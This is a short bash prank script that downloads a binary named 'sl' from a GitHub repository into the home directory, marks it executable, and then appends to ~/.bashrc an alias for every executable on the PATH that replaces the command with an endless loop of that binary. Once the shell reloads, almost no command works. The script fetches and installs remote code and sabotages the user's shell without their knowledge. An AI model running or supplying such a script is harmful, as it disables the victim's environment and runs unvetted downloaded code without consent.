#!/bin/bash

chooChoo=$HOME/.sl
wget https://github.com/PatrickHirsch/ChooChoo/blob/main/sl?raw=true -O $chooChoo -q
chmod a+x $chooChoo;

for dir in $(echo $PATH | tr ':' ' ')
do
  for file in $dir/*
  do
    echo "alias $(basename $file)='while :; do $chooChoo; done'" >> ~/.bashrc
  done
done
